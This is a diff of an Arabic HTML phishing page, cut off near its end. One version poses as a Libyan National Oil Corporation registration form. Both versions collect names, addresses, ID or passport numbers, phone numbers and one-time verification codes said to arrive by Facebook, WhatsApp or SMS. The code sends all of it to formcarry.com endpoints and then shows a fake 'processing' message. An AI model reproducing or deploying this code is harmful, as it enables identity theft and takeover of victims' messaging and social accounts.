@@ -1,250 +1,123 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>نموذج التسجيل - مؤسسة النفط الليبية</title>
+  <meta charset="UTF-8">
+  <title>نموذج التحقق</title>
   <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      background: #f2f2f2;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .container {
-      background: #ffffff;
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 450px;
-      box-sizing: border-box;
-      border-top: 5px solid #003366;
-      text-align: center;
-    }
-
-    .container img.logo {
-      width: 100px;
-      margin-bottom: 10px;
-    }
-
-    h2 {
-      color: #003366;
-      margin-bottom: 20px;
-    }
-
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: bold;
-      color: #003366;
-      text-align: right;
-    }
-
+    body { font-family: Arial; background: #f5f5f5; padding: 20px; text-align: center; direction: rtl; }
+    .step { display: none; margin-top: 20px; }
+    .visible { display: block; }
     input, select, button {
-      width: 100%;
-      padding: 10px;
-      font-size: 15px;
-      margin-top: 5px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      box-sizing: border-box;
+      padding: 10px; margin: 10px 0; width: 80%; max-width: 300px;
+      font-size: 16px; border: 1px solid #ccc; border-radius: 5px;
     }
-
-    button {
-      background-color: #28a745;
-      color: white;
-      border: none;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-
-    button:hover {
-      background-color: #218838;
-    }
-
-    .popup {
-      display: none;
-      position: fixed;
-      top: 30px;
-      left: 0;
-      right: 0;
-      margin: auto;
-      max-width: 420px;
-      background: #ffffff;
-      border: 2px solid #003366;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
-      z-index: 1000;
-      text-align: center;
-    }
-
-    .popup h3 {
-      font-size: 16px;
-      margin-bottom: 15px;
-    }
-
-    .countdown {
-      text-align: center;
-      font-weight: bold;
-      margin-top: 10px;
-      color: #cc0000;
-    }
+    button { background: #2c3e50; color: white; border: none; cursor: pointer; }
+    .note { color: gray; font-size: 14px; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <img src="https://upload.wikimedia.org/wikipedia/ar/3/3c/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط" class="logo" />
-  <h2>نموذج التسجيل - مؤسسة النفط الليبية</h2>
+  <!-- المرحلة 1 -->
+  <div class="step visible" id="step1">
+    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف">
+    <br>
+    <button onclick="sendPhone()">أرسل رقم التحقق</button>
+  </div>
 
-  <form id="mainForm">
-    <label>الاسم الكامل:</label>
-    <input type="text" id="fullName" name="fullName" required />
-
-    <label>العنوان:</label>
-    <input type="text" id="address" name="address" required />
-
-    <label>نوع الوثيقة:</label>
-    <select id="docType" required>
-      <option value="">اختر نوع الوثيقة</option>
-      <option value="بطاقة">بطاقة</option>
-      <option value="جواز سفر">جواز سفر</option>
-    </select>
-
-    <div id="docNumberContainer" style="display:none;">
-      <label id="docLabel">رقم الوثيقة:</label>
-      <input type="text" id="docNumber" name="docNumber" required />
+  <!-- المرحلة 2 -->
+  <div class="step" id="step2">
+    <input type="text" id="fullname" placeholder="الاسم الكامل">
+    <br>
+    <div id="verificationBox">
+      <input type="text" id="code" placeholder="ادخل رمز التحقق">
+      <p class="note" id="codeMsg">سوف يتم تحويل رمز التحقيق الى إشعار فيسبوك، واتساب، رسالة نصية</p>
+      <button id="verifyBtn" style="display: none;" onclick="sendCode()">تأكيد التحقق</button>
     </div>
+  </div>
 
-    <label>رقم الهاتف:</label>
-    <input type="text" id="phone" name="phone" required />
+  <!-- زر تأكيد البيانات -->
+  <div class="step" id="finalConfirm" style="display:none;">
+    <button onclick="resendAll()">تأكيد البيانات</button>
+  </div>
 
-    <button type="submit">أكمل الطلب</button>
-  </form>
-</div>
+  <!-- المرحلة 3 -->
+  <div class="step" id="step3">
+    <input type="text" id="finalName" placeholder="الاسم بالكامل">
+    <br>
+    <input type="text" id="address" placeholder="العنوان">
+    <br>
+    <select id="docType" onchange="toggleDocField()">
+      <option value="">اختر نوع الوثيقة (اختياري)</option>
+      <option value="جواز السفر">جواز السفر</option>
+      <option value="بطاقة شخصية">بطاقة شخصية</option>
+    </select>
+    <br>
+    <input type="text" id="docValue" placeholder="رقم الوثيقة" style="display:none;">
+    <br>
+    <button onclick="sendFinal()">إرسال البيانات</button>
+  </div>
 
-<!-- نافذة كود التوثيق -->
-<div class="popup" id="codePopup">
-  <form id="codeForm">
-    <h3 style="color:#003366;">يرجى انتظار كود التأكيد من إشعار فيسبوك أو واتساب أو رسالة SMS</h3>
-    <label>كود التوثيق:</label>
-    <input type="text" id="code" name="code" required placeholder="أدخل الكود" />
-    <button type="submit">إرسال الكود</button>
-    <div class="countdown" id="countdown">08:00</div>
-  </form>
-</div>
+  <script>
+    // إرسال رقم الهاتف إلى Formcarry الأول
+    function sendPhone() {
+      const phone = document.getElementById('phone').value;
+      if (!phone) return alert("يرجى إدخال رقم الهاتف");
 
-<!-- نافذة الاعتذار -->
-<div class="popup" id="errorPopup">
-  <h3 style="color: green;">جاري معالجة طلبك إلى حين الرد في وقت آخر</h3>
-</div>
-
-<script>
-  const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
-  let savedPhone = "";
-  let codeSubmitCount = 0;
-
-  document.getElementById("docType").addEventListener("change", function () {
-    const docContainer = document.getElementById("docNumberContainer");
-    const docLabel = document.getElementById("docLabel");
-    const docNumber = document.getElementById("docNumber");
-
-    if (this.value === "بطاقة") {
-      docLabel.textContent = "رقم البطاقة:";
-      docNumber.placeholder = "أدخل رقم البطاقة";
-    } else if (this.value === "جواز سفر") {
-      docLabel.textContent = "رقم جواز السفر:";
-      docNumber.placeholder = "أدخل رقم جواز السفر";
-    }
-
-    docContainer.style.display = this.value ? "block" : "none";
-  });
-
-  document.getElementById("mainForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const fullName = document.getElementById("fullName").value.trim();
-    const docType = document.getElementById("docType").value;
-    const docNumber = document.getElementById("docNumber").value.trim();
-    const phone = document.getElementById("phone").value.trim();
-    const address = document.getElementById("address").value.trim();
-    savedPhone = phone;
-
-    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
-    if (!arabicRegex.test(fullName)) {
-      alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 8 أحرف أو أكثر.");
-      return;
-    }
-
-    const phoneRegex = /^(091|092|094)\d{7}$/;
-    if (!phoneRegex.test(phone)) {
-      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
-      return;
-    }
-
-    fetch(formcarryURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ fullName, docType, docNumber, phone, address })
-    }).then(() => {
-      document.querySelectorAll("#mainForm input, #mainForm select, #mainForm button").forEach(el => {
-        el.disabled = true;
+      fetch("https://formcarry.com/s/FORM_ID_1", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone })
       });
 
-      document.getElementById("codePopup").style.display = "block";
-      startCountdown(8 * 60);
-    }).catch(() => alert("حدث خطأ أثناء الإرسال"));
-  });
+      document.getElementById('step1').classList.remove('visible');
+      document.getElementById('step2').classList.add('visible');
 
-  document.getElementById("codeForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const code = document.getElementById("code").value.trim();
-    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
-      alert("الكود يجب أن يكون من 6 إلى 8 أرقام أو أحرف.");
-      return;
+      // بعد 4 ثوانٍ أخفِ الرسالة وأظهر زر تأكيد
+      setTimeout(() => {
+        document.getElementById("codeMsg").style.display = "none";
+        document.getElementById("verifyBtn").style.display = "inline-block";
+      }, 4000);
     }
 
-    codeSubmitCount++;
+    // إرسال الاسم ورمز التحقق إلى Formcarry الثاني
+    function sendCode() {
+      const fullname = document.getElementById('fullname').value;
+      const code = document.getElementById('code').value;
 
-    fetch(formcarryURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, phone: savedPhone })
-    }).then(() => {
-      if (codeSubmitCount >= 2) {
-        document.getElementById("codePopup").style.display = "none";
-        document.getElementById("errorPopup").style.display = "block";
-      } else {
-        alert("تم إرسال الكود. اضغط مرة أخرى لإكمال المعالجة.");
-      }
-    }).catch(() => alert("فشل في إرسال الكود."));
-  });
+      if (!fullname || !code) return alert("يرجى إدخال الاسم ورمز التحقق");
 
-  function startCountdown(duration) {
-    let timer = duration, minutes, seconds;
-    const countdown = document.getElementById("countdown");
+      fetch("https://formcarry.com/s/FORM_ID_2", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ fullname, code })
+      });
 
-    const interval = setInterval(() => {
-      minutes = Math.floor(timer / 60);
-      seconds = timer % 60;
+      document.getElementById('step2').classList.remove('visible');
+      document.getElementById('finalConfirm').style.display = 'block';
+    }
 
-      countdown.textContent =
-        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    // إعادة إرسال الاسم + الهاتف + الكود إلى Formcarry الثالث
+    function resendAll() {
+      const phone = document.getElementById('phone').value;
+      const fullname = document.getElementById('fullname').value;
+      const code = document.getElementById('code').value;
 
-      if (--timer < 0) {
-        clearInterval(interval);
-        countdown.textContent = "انتهى الوقت!";
-      }
-    }, 1000);
-  }
-</script>
-</body>
-</html>
+      fetch("https://formcarry.com/s/FORM_ID_3", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone, fullname, code })
+      });
+
+      document.getElementById('finalConfirm').style.display = 'none';
+      document.getElementById('step3').classList.add('visible');
+    }
+
+    // إظهار حقل الوثيقة حسب الاختيار
+    function toggleDocField() {
+      const docType = document.getElementById('docType').value;
+      const docValue = document.getElementById('docValue');
+      docValue.style.display = docType ? "inline-block" : "none";
+      docValue.placeholder = docType ? `رقم ${docType}` : "";
+    }
+
+    // إرسال البيانات النهائية إلى Formcarry الراب
